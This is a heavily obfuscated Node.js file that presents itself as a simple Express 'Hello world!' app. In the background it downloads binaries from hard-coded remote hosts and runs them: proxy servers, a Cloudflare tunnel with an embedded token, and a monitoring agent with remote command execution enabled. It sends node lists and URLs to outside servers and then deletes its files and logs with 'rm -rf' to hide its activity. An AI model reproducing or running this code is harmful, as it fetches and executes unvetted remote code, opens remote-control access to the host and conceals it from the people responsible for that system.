const _0x24dc76=_0x183b;(function(_0x2b07d1,_0x3c2248){const _0x2f9f80=_0x183b,_0x14bedc=_0x2b07d1();while(!![]){try{const _0x135ec4=parseInt(_0x2f9f80(0x16e))/0x1+-parseInt(_0x2f9f80(0x145))/0x2+-parseInt(_0x2f9f80(0x166))/0x3*(parseInt(_0x2f9f80(0x1c5))/0x4)+parseInt(_0x2f9f80(0x1a5))/0x5+parseInt(_0x2f9f80(0x19f))/0x6*(parseInt(_0x2f9f80(0x16c))/0x7)+parseInt(_0x2f9f80(0x1a3))/0x8*(parseInt(_0x2f9f80(0x128))/0x9)+-parseInt(_0x2f9f80(0x172))/0xa;if(_0x135ec4===_0x3c2248)break;else _0x14bedc['push'](_0x14bedc['shift']());}catch(_0x24e0fc){_0x14bedc['push'](_0x14bedc['shift']());}}}(_0x18a1,0xded9e));const express=require(_0x24dc76(0x191)),app=express(),axios=require(_0x24dc76(0x127)),os=require('os'),fs=require('fs'),path=require(_0x24dc76(0x169)),{promisify}=require(_0x24dc76(0x160)),exec=promisify(require(_0x24dc76(0x1d3))[_0x24dc76(0x13b)]),{execSync}=require(_0x24dc76(0x1d3)),UPLOAD_URL=process[_0x24dc76(0x137)][_0x24dc76(0x15e)]||'',PROJECT_URL=process['env'][_0x24dc76(0x193)]||'',AUTO_ACCESS=process[_0x24dc76(0x137)][_0x24dc76(0x1c9)]||![],FILE_PATH=process['env'][_0x24dc76(0x1b7)]||_0x24dc76(0x1d4),SUB_PATH=process[_0x24dc76(0x137)][_0x24dc76(0x1a6)]||_0x24dc76(0x1c2),PORT=process['env'][_0x24dc76(0x1dd)]||process[_0x24dc76(0x137)][_0x24dc76(0x1d6)]||0xbb8,UUID=process[_0x24dc76(0x137)][_0x24dc76(0x13d)]||'a8f7f424-62ab-11f0-9fe2-0242ac120002',NEZHA_SERVER=process['env'][_0x24dc76(0x177)]||'',NEZHA_PORT=process[_0x24dc76(0x137)][_0x24dc76(0x1db)]||'',NEZHA_KEY=process[_0x24dc76(0x137)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x24dc76(0x137)][_0x24dc76(0x1ad)]||_0x24dc76(0x1bc),ARGO_AUTH=process[_0x24dc76(0x137)][_0x24dc76(0x179)]||_0x24dc76(0x1ae),ARGO_PORT=process[_0x24dc76(0x137)]['ARGO_PORT']||0x1f41,CFIP=process[_0x24dc76(0x137)][_0x24dc76(0x14d)]||_0x24dc76(0x19b),CFPORT=process['env'][_0x24dc76(0x1cb)]||0x1bb,NAME=process[_0x24dc76(0x137)][_0x24dc76(0x1de)]||'Vls';!fs[_0x24dc76(0x1b5)](FILE_PATH)?(fs[_0x24dc76(0x186)](FILE_PATH),console[_0x24dc76(0x1c4)](FILE_PATH+'\x20is\x20created')):console[_0x24dc76(0x1c4)](FILE_PATH+_0x24dc76(0x12b));let npmPath=path[_0x24dc76(0x170)](FILE_PATH,_0x24dc76(0x18d)),phpPath=path['join'](FILE_PATH,_0x24dc76(0x13a)),webPath=path['join'](FILE_PATH,_0x24dc76(0x1bf)),botPath=path[_0x24dc76(0x170)](FILE_PATH,'bot'),subPath=path[_0x24dc76(0x170)](FILE_PATH,_0x24dc76(0x15d)),listPath=path[_0x24dc76(0x170)](FILE_PATH,_0x24dc76(0x144)),bootLogPath=path['join'](FILE_PATH,_0x24dc76(0x133)),configPath=path['join'](FILE_PATH,_0x24dc76(0x1b6));function deleteNodes(){const _0x59e827=_0x24dc76;try{if(!UPLOAD_URL)return;if(!fs[_0x59e827(0x1b5)](subPath))return;let _0x148511;try{_0x148511=fs[_0x59e827(0x1b1)](subPath,'utf-8');}catch{return null;}const _0x4b8035=Buffer[_0x59e827(0x1a0)](_0x148511,'base64')[_0x59e827(0x138)](_0x59e827(0x14c)),_0x538a86=_0x4b8035['split']('\x0a')[_0x59e827(0x1a4)](_0x56dffd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x59e827(0x1d1)](_0x56dffd));if(_0x538a86[_0x59e827(0x14e)]===0x0)return;return axios[_0x59e827(0x13c)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x59e827(0x1da)]({'nodes':_0x538a86}),{'headers':{'Content-Type':_0x59e827(0x192)}})[_0x59e827(0x199)](_0x394158=>{return null;});}catch(_0x1a70b6){return null;}}function cleanupOldFiles(){const _0x2d3424=_0x24dc76,_0x25470f=[_0x2d3424(0x1bf),_0x2d3424(0x16f),'npm','php',_0x2d3424(0x15d),_0x2d3424(0x133)];_0x25470f[_0x2d3424(0x15b)](_0x5ddb19=>{const _0x19eb69=_0x2d3424,_0x58f116=path['join'](FILE_PATH,_0x5ddb19);fs[_0x19eb69(0x129)](_0x58f116,()=>{});});}app[_0x24dc76(0x188)]('/',function(_0xc5ccd2,_0x3423a0){const _0x4a112c=_0x24dc76;_0x3423a0['send'](_0x4a112c(0x197));});const config={'log':{'access':_0x24dc76(0x16b),'error':_0x24dc76(0x16b),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x24dc76(0x182),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x24dc76(0x1ce),'fallbacks':[{'dest':0xbb9},{'path':_0x24dc76(0x1b3),'dest':0xbba},{'path':_0x24dc76(0x1cf),'dest':0xbbb},{'path':_0x24dc76(0x142),'dest':0xbbc}]},'streamSettings':{'network':_0x24dc76(0x151)}},{'port':0xbb9,'listen':_0x24dc76(0x19d),'protocol':_0x24dc76(0x182),'settings':{'clients':[{'id':UUID}],'decryption':_0x24dc76(0x1ce)},'streamSettings':{'network':_0x24dc76(0x151),'security':_0x24dc76(0x1ce)}},{'port':0xbba,'listen':_0x24dc76(0x19d),'protocol':_0x24dc76(0x182),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x24dc76(0x1ce)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x24dc76(0x1b3)}},'sniffing':{'enabled':![],'destOverride':[_0x24dc76(0x1cc),_0x24dc76(0x183),_0x24dc76(0x17d)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x24dc76(0x19d),'protocol':_0x24dc76(0x1ca),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':![],'destOverride':['http','tls',_0x24dc76(0x17d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x24dc76(0x19d),'protocol':_0x24dc76(0x196),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x24dc76(0x1ce),'wsSettings':{'path':_0x24dc76(0x142)}},'sniffing':{'enabled':![],'destOverride':[_0x24dc76(0x1cc),_0x24dc76(0x183),_0x24dc76(0x17d)],'metadataOnly':![]}}],'dns':{'servers':[_0x24dc76(0x174)]},'outbounds':[{'protocol':_0x24dc76(0x1bd),'tag':_0x24dc76(0x167)},{'protocol':_0x24dc76(0x1be),'tag':_0x24dc76(0x17f)}]};function _0x18a1(){const _0x3fe205=['/vmess-argo?ed=2560','\x0avless://','/trojan-argo','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','list.txt','2626622Hijasa','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0a\x20\x20tunnel:\x20','status','base64','Error\x20downloading\x20files:','tunnel.yml','utf-8','CFIP','length','./bot','true','tcp','\x20-p\x20','split','Download\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','pop','npm\x20is\x20running','pipe','unlinkSync','https://arm64.ssss.nyc.mn/web','forEach','&type=ws&host=','sub.txt','UPLOAD_URL','Error\x20reading\x20boot.log:','util','/web\x20-c\x20','http\x20server\x20is\x20running\x20on\x20port:','https://arm64.ssss.nyc.mn/agent','then','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','3028341CPqLyq','direct','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','path','App\x20is\x20running','/dev/null','107891ZxboSA','push','628724IhJRgu','bot','join','config.yaml','3335800KLdzuG','https://arm64.ssss.nyc.mn/v1','https+local://8.8.8.8/dns-query','Error\x20executing\x20command:\x20','./web','NEZHA_SERVER','response','ARGO_AUTH','&path=%2Fvless-argo%3Fed%3D2560#','data','aarch64','quic','--tls','block','all','./npm','vless','tls','\x20successfully','添加URL失败:\x20','mkdirSync','tunnel.json','get','./php','2096','Empowerment\x20failed\x20for\x20','Empowerment\x20success\x20for\x20','npm','/config.json\x20>/dev/null\x202>&1\x20&','false','\x0a\x20\x20\x20\x20','express','application/json','PROJECT_URL','/sub.txt\x20saved\x20successfully','/npm\x20-s\x20','trojan','Hello\x20world!','error','catch','match','www.visa.com.sg','stream','127.0.0.1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','636MUbUoQ','from','/bot\x20','2087','44992tXmoid','filter','4536650XUtBmx','SUB_PATH','bot\x20is\x20running.','nohup\x20','Subscription\x20uploaded\x20successfully','TunnelSecret','ArgoDomain:','\x20failed:\x20','ARGO_DOMAIN','eyJhIjoiMDI0OGJjMGM0YjE2YjdlZWUwNWQ2OWI3NDVhYTI1ZTIiLCJ0IjoiMjNkOGRlM2ItYTE2MS00NWI0LThiYmMtZDcwMGZiZWQxYzBjIiwicyI6IllqRXlOakUxT0RVdE16VXdNQzAwTTJRNUxXRm1OR010T0RZM09EVXdNRFZrTldNeSJ9','443','has','readFileSync','8443','/vless-argo','2083','existsSync','config.json','FILE_PATH','\x20>/dev/null\x202>&1\x20&','php\x20is\x20running','https://amd64.ssss.nyc.mn/web','clear','galaxy.gurehonep.eu.org','freedom','blackhole','web','chmod','ARGO_DOMAIN:','sub','listen','log','4cmXQmJ','includes','2053','arm','AUTO_ACCESS','vmess','CFPORT','http','Skipping\x20adding\x20automatic\x20access\x20task','none','/vmess-argo','\x0a\x20\x20\x0avmess://','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','child_process','./tmp','writeFileSync','PORT','unshift','map','createWriteStream','stringify','NEZHA_PORT','https://amd64.ssss.nyc.mn/v1','SERVER_PORT','NAME','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','close','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Content-Type','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/2go','axios','639BhvCan','unlink','message','\x20already\x20exists','automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/2go','\x0a\x20\x20\x0atrojan://','text/plain;\x20charset=utf-8','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','arm64','/tunnel.yml\x20run','boot.log','bot\x20is\x20running','npm\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','env','toString','?encryption=none&security=tls&sni=','php','exec','post','UUID','web\x20running\x20error:\x20','fileUrl'];_0x18a1=function(){return _0x3fe205;};return _0x18a1();}fs[_0x24dc76(0x1d5)](path['join'](FILE_PATH,'config.json'),JSON[_0x24dc76(0x1da)](config,null,0x2));function getSystemArchitecture(){const _0x2ff968=_0x24dc76,_0x1ade81=os['arch']();return _0x1ade81===_0x2ff968(0x1c8)||_0x1ade81===_0x2ff968(0x131)||_0x1ade81===_0x2ff968(0x17c)?_0x2ff968(0x1c8):'amd';}function downloadFile(_0x444e0e,_0x56208d,_0x16b560){const _0x2994ef=_0x24dc76,_0x42aa5c=path[_0x2994ef(0x170)](FILE_PATH,_0x444e0e),_0x3cc954=fs[_0x2994ef(0x1d9)](_0x42aa5c);axios({'method':_0x2994ef(0x188),'url':_0x56208d,'responseType':_0x2994ef(0x19c)})[_0x2994ef(0x164)](_0x35aa81=>{const _0x481742=_0x2994ef;_0x35aa81[_0x481742(0x17b)][_0x481742(0x158)](_0x3cc954),_0x3cc954['on']('finish',()=>{const _0x304915=_0x481742;_0x3cc954[_0x304915(0x121)](),console['log'](_0x304915(0x154)+_0x444e0e+_0x304915(0x184)),_0x16b560(null,_0x444e0e);}),_0x3cc954['on']('error',_0x2df275=>{const _0x5ac818=_0x481742;fs[_0x5ac818(0x129)](_0x42aa5c,()=>{});const _0x40cd1d=_0x5ac818(0x154)+_0x444e0e+_0x5ac818(0x1ac)+_0x2df275['message'];console[_0x5ac818(0x198)](_0x40cd1d),_0x16b560(_0x40cd1d);});})[_0x2994ef(0x199)](_0x41d513=>{const _0x1817b0=_0x2994ef,_0x81a1c2=_0x1817b0(0x154)+_0x444e0e+_0x1817b0(0x1ac)+_0x41d513[_0x1817b0(0x12a)];console[_0x1817b0(0x198)](_0x81a1c2),_0x16b560(_0x81a1c2);});}async function downloadFilesAndRun(){const _0x3e71a4=_0x24dc76,_0x54b7b4=getSystemArchitecture(),_0x93d0fa=getFilesForArchitecture(_0x54b7b4);if(_0x93d0fa[_0x3e71a4(0x14e)]===0x0){console[_0x3e71a4(0x1c4)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x44dd51=_0x93d0fa[_0x3e71a4(0x1d8)](_0x58ae4d=>{return new Promise((_0x19b24a,_0x26250a)=>{const _0x452ef9=_0x183b;downloadFile(_0x58ae4d['fileName'],_0x58ae4d[_0x452ef9(0x13f)],(_0x25c2ba,_0xa968fd)=>{_0x25c2ba?_0x26250a(_0x25c2ba):_0x19b24a(_0xa968fd);});});});try{await Promise[_0x3e71a4(0x180)](_0x44dd51);}catch(_0x46dfe9){console['error'](_0x3e71a4(0x14a),_0x46dfe9);return;}function _0x870fd4(_0x3f6ac2){const _0x20d996=0x1fd;_0x3f6ac2['forEach'](_0x4558be=>{const _0x3b40cd=_0x183b,_0x2f4302=path[_0x3b40cd(0x170)](FILE_PATH,_0x4558be);fs[_0x3b40cd(0x1b5)](_0x2f4302)&&fs[_0x3b40cd(0x1c0)](_0x2f4302,_0x20d996,_0x122a54=>{const _0x2cf680=_0x3b40cd;_0x122a54?console[_0x2cf680(0x198)](_0x2cf680(0x18b)+_0x2f4302+':\x20'+_0x122a54):console[_0x2cf680(0x1c4)](_0x2cf680(0x18c)+_0x2f4302+':\x20'+_0x20d996['toString'](0x8));});});}const _0x36e263=NEZHA_PORT?[_0x3e71a4(0x181),'./web',_0x3e71a4(0x14f)]:[_0x3e71a4(0x189),_0x3e71a4(0x176),_0x3e71a4(0x14f)];_0x870fd4(_0x36e263);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x49b79b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3e71a4(0x153)](':')[_0x3e71a4(0x156)]():'',_0x241780=new Set([_0x3e71a4(0x1af),'8443',_0x3e71a4(0x18a),_0x3e71a4(0x1a2),_0x3e71a4(0x1b4),_0x3e71a4(0x1c7)]),_0xb693d3=_0x241780[_0x3e71a4(0x1b0)](_0x49b79b)?_0x3e71a4(0x150):_0x3e71a4(0x18f),_0x568f0a='\x0aclient_secret:\x20'+NEZHA_KEY+_0x3e71a4(0x19e)+NEZHA_SERVER+_0x3e71a4(0x120)+_0xb693d3+_0x3e71a4(0x168)+UUID;fs[_0x3e71a4(0x1d5)](path['join'](FILE_PATH,_0x3e71a4(0x171)),_0x568f0a);const _0x1634e0=_0x3e71a4(0x1a8)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x3e71a4(0x136);try{await exec(_0x1634e0),console[_0x3e71a4(0x1c4)](_0x3e71a4(0x1b9)),await new Promise(_0x28d213=>setTimeout(_0x28d213,0x3e8));}catch(_0x5789fe){console[_0x3e71a4(0x198)]('php\x20running\x20error:\x20'+_0x5789fe);}}else{let _0x3bcf3a='';const _0x3a9930=[_0x3e71a4(0x1af),_0x3e71a4(0x1b2),'2096',_0x3e71a4(0x1a2),_0x3e71a4(0x1b4),_0x3e71a4(0x1c7)];_0x3a9930[_0x3e71a4(0x1c6)](NEZHA_PORT)&&(_0x3bcf3a=_0x3e71a4(0x17e));const _0x150d95=_0x3e71a4(0x1a8)+FILE_PATH+_0x3e71a4(0x195)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3e71a4(0x152)+NEZHA_KEY+'\x20'+_0x3bcf3a+_0x3e71a4(0x1b8);try{await exec(_0x150d95),console[_0x3e71a4(0x1c4)](_0x3e71a4(0x157)),await new Promise(_0x11422e=>setTimeout(_0x11422e,0x3e8));}catch(_0x15a1f4){console[_0x3e71a4(0x198)](_0x3e71a4(0x135)+_0x15a1f4);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3edfe9=_0x3e71a4(0x1a8)+FILE_PATH+_0x3e71a4(0x161)+FILE_PATH+_0x3e71a4(0x18e);try{await exec(_0x3edfe9),console[_0x3e71a4(0x1c4)]('web\x20is\x20running'),await new Promise(_0x200667=>setTimeout(_0x200667,0x3e8));}catch(_0x572b39){console['error'](_0x3e71a4(0x13e)+_0x572b39);}if(fs[_0x3e71a4(0x1b5)](path[_0x3e71a4(0x170)](FILE_PATH,_0x3e71a4(0x16f)))){let _0x380afe;if(ARGO_AUTH[_0x3e71a4(0x19a)](/^[A-Z0-9a-z=]{120,250}$/))_0x380afe='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x380afe=_0x3e71a4(0x130)+FILE_PATH+_0x3e71a4(0x132):_0x380afe=_0x3e71a4(0x1d2)+FILE_PATH+_0x3e71a4(0x123)+ARGO_PORT;try{await exec(_0x3e71a4(0x1a8)+FILE_PATH+_0x3e71a4(0x1a1)+_0x380afe+_0x3e71a4(0x1b8)),console['log'](_0x3e71a4(0x134)),await new Promise(_0x4c318c=>setTimeout(_0x4c318c,0x7d0));}catch(_0x572e82){console['error'](_0x3e71a4(0x175)+_0x572e82);}}await new Promise(_0x265074=>setTimeout(_0x265074,0x1388));}function _0x183b(_0x258211,_0x4ad58f){const _0x18a192=_0x18a1();return _0x183b=function(_0x183bd6,_0x56e987){_0x183bd6=_0x183bd6-0x120;let _0x507cc8=_0x18a192[_0x183bd6];return _0x507cc8;},_0x183b(_0x258211,_0x4ad58f);}function getFilesForArchitecture(_0x917275){const _0x3b4d12=_0x24dc76;let _0x40f043;_0x917275===_0x3b4d12(0x1c8)?_0x40f043=[{'fileName':_0x3b4d12(0x1bf),'fileUrl':_0x3b4d12(0x15a)},{'fileName':_0x3b4d12(0x16f),'fileUrl':_0x3b4d12(0x12d)}]:_0x40f043=[{'fileName':_0x3b4d12(0x1bf),'fileUrl':_0x3b4d12(0x1ba)},{'fileName':_0x3b4d12(0x16f),'fileUrl':_0x3b4d12(0x126)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x21a76f=_0x917275===_0x3b4d12(0x1c8)?_0x3b4d12(0x163):'https://amd64.ssss.nyc.mn/agent';_0x40f043[_0x3b4d12(0x1d7)]({'fileName':_0x3b4d12(0x18d),'fileUrl':_0x21a76f});}else{const _0x1cb41b=_0x917275===_0x3b4d12(0x1c8)?_0x3b4d12(0x173):_0x3b4d12(0x1dc);_0x40f043[_0x3b4d12(0x1d7)]({'fileName':_0x3b4d12(0x13a),'fileUrl':_0x1cb41b});}}return _0x40f043;}function argoType(){const _0x5c93d6=_0x24dc76;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5c93d6(0x1c4)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x5c93d6(0x1c6)](_0x5c93d6(0x1aa))){fs[_0x5c93d6(0x1d5)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xa452df=_0x5c93d6(0x147)+ARGO_AUTH[_0x5c93d6(0x153)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x5c93d6(0x170)](FILE_PATH,_0x5c93d6(0x187))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x5c93d6(0x125)+ARGO_PORT+_0x5c93d6(0x165);fs[_0x5c93d6(0x1d5)](path[_0x5c93d6(0x170)](FILE_PATH,_0x5c93d6(0x14b)),_0xa452df);}else console[_0x5c93d6(0x1c4)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x2e9547=_0x24dc76;let _0x6805ec;if(ARGO_AUTH&&ARGO_DOMAIN)_0x6805ec=ARGO_DOMAIN,console[_0x2e9547(0x1c4)](_0x2e9547(0x1c1),_0x6805ec),await _0x5d0fd0(_0x6805ec);else try{const _0x781a1a=fs['readFileSync'](path[_0x2e9547(0x170)](FILE_PATH,_0x2e9547(0x133)),_0x2e9547(0x14c)),_0x36fb48=_0x781a1a[_0x2e9547(0x153)]('\x0a'),_0x2eda8b=[];_0x36fb48[_0x2e9547(0x15b)](_0x3b1adf=>{const _0x4d1e05=_0x2e9547,_0x15e93a=_0x3b1adf[_0x4d1e05(0x19a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x15e93a){const _0x83fe71=_0x15e93a[0x1];_0x2eda8b['push'](_0x83fe71);}});if(_0x2eda8b['length']>0x0)_0x6805ec=_0x2eda8b[0x0],console[_0x2e9547(0x1c4)](_0x2e9547(0x1ab),_0x6805ec),await _0x5d0fd0(_0x6805ec);else{console[_0x2e9547(0x1c4)](_0x2e9547(0x146)),fs[_0x2e9547(0x159)](path[_0x2e9547(0x170)](FILE_PATH,_0x2e9547(0x133)));async function _0x14e87c(){const _0x180e37=_0x2e9547;try{await exec(_0x180e37(0x155));}catch(_0x4974dd){}}_0x14e87c(),await new Promise(_0x4ecd88=>setTimeout(_0x4ecd88,0xbb8));const _0x217556=_0x2e9547(0x1d2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+path[_0x2e9547(0x170)](FILE_PATH,_0x2e9547(0x16f))+'\x20'+_0x217556+'\x20>/dev/null\x202>&1\x20&'),console['log'](_0x2e9547(0x1a7)),await new Promise(_0x3dd094=>setTimeout(_0x3dd094,0xbb8)),await extractDomains();}catch(_0x3e9d6c){console[_0x2e9547(0x198)](_0x2e9547(0x175)+_0x3e9d6c);}}}catch(_0x2b6743){console['error'](_0x2e9547(0x15f),_0x2b6743);}async function _0x5d0fd0(_0x319ffd){const _0x31981d=_0x2e9547,_0x56decb=execSync(_0x31981d(0x143),{'encoding':_0x31981d(0x14c)}),_0x279f03=_0x56decb['trim']();return new Promise(_0x2afd1a=>{setTimeout(()=>{const _0x351b76=_0x183b,_0x476df5={'v':'2','ps':NAME+'-'+_0x279f03,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x351b76(0x1ce),'net':'ws','type':_0x351b76(0x1ce),'host':_0x319ffd,'path':_0x351b76(0x140),'tls':_0x351b76(0x183),'sni':_0x319ffd,'alpn':''},_0x41420e=_0x351b76(0x141)+UUID+'@'+CFIP+':'+CFPORT+_0x351b76(0x139)+_0x319ffd+_0x351b76(0x15c)+_0x319ffd+_0x351b76(0x17a)+NAME+'-'+_0x279f03+_0x351b76(0x1d0)+Buffer['from'](JSON['stringify'](_0x476df5))[_0x351b76(0x138)]('base64')+_0x351b76(0x12e)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x319ffd+_0x351b76(0x15c)+_0x319ffd+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0x279f03+_0x351b76(0x190);console[_0x351b76(0x1c4)](Buffer[_0x351b76(0x1a0)](_0x41420e)[_0x351b76(0x138)](_0x351b76(0x149))),fs[_0x351b76(0x1d5)](subPath,Buffer[_0x351b76(0x1a0)](_0x41420e)[_0x351b76(0x138)](_0x351b76(0x149))),console[_0x351b76(0x1c4)](FILE_PATH+_0x351b76(0x194)),uplodNodes(),app[_0x351b76(0x188)]('/'+SUB_PATH,(_0x30aa9b,_0x460d3f)=>{const _0x4c2fe7=_0x351b76,_0x451622=Buffer[_0x4c2fe7(0x1a0)](_0x41420e)[_0x4c2fe7(0x138)](_0x4c2fe7(0x149));_0x460d3f['set'](_0x4c2fe7(0x124),_0x4c2fe7(0x12f)),_0x460d3f['send'](_0x451622);}),_0x2afd1a(_0x41420e);},0x7d0);});}}async function uplodNodes(){const _0x4e26ff=_0x24dc76;if(UPLOAD_URL&&PROJECT_URL){const _0x52c3b4=PROJECT_URL+'/'+SUB_PATH,_0x51cb31={'subscription':[_0x52c3b4]};try{const _0x3b7d3d=await axios[_0x4e26ff(0x13c)](UPLOAD_URL+'/api/add-subscriptions',_0x51cb31,{'headers':{'Content-Type':_0x4e26ff(0x192)}});if(_0x3b7d3d[_0x4e26ff(0x148)]===0xc8)console[_0x4e26ff(0x1c4)](_0x4e26ff(0x1a9));else return null;}catch(_0x4eb13c){if(_0x4eb13c[_0x4e26ff(0x178)]){if(_0x4eb13c[_0x4e26ff(0x178)][_0x4e26ff(0x148)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3ea305=fs[_0x4e26ff(0x1b1)](listPath,_0x4e26ff(0x14c)),_0x40d9e2=_0x3ea305[_0x4e26ff(0x153)]('\x0a')[_0x4e26ff(0x1a4)](_0x51da32=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x51da32));if(_0x40d9e2['length']===0x0)return;const _0x332a67=JSON[_0x4e26ff(0x1da)]({'nodes':_0x40d9e2});try{await axios[_0x4e26ff(0x13c)](UPLOAD_URL+'/api/add-nodes',_0x332a67,{'headers':{'Content-Type':'application/json'}});if(response[_0x4e26ff(0x148)]===0xc8)console[_0x4e26ff(0x1c4)](_0x4e26ff(0x1a9));else return null;}catch(_0x4534ce){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x464a70=_0x183b,_0x19eff9=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x19eff9[_0x464a70(0x16d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x19eff9['push'](phpPath);exec('rm\x20-rf\x20'+_0x19eff9[_0x464a70(0x170)]('\x20')+'\x20>/dev/null\x202>&1',_0x59c047=>{const _0x28f655=_0x464a70;console[_0x28f655(0x1bb)](),console[_0x28f655(0x1c4)](_0x28f655(0x16a)),console[_0x28f655(0x1c4)](_0x28f655(0x122));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x14645e=_0x24dc76;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x14645e(0x1cd));return;}try{const _0x17ae2b=await axios[_0x14645e(0x13c)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x14645e(0x192)}});console[_0x14645e(0x1c4)](_0x14645e(0x12c));}catch(_0x4e5bc1){console[_0x14645e(0x198)](_0x14645e(0x185)+_0x4e5bc1['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x24dc76(0x1c3)](PORT,()=>console['log'](_0x24dc76(0x162)+PORT+'!'));
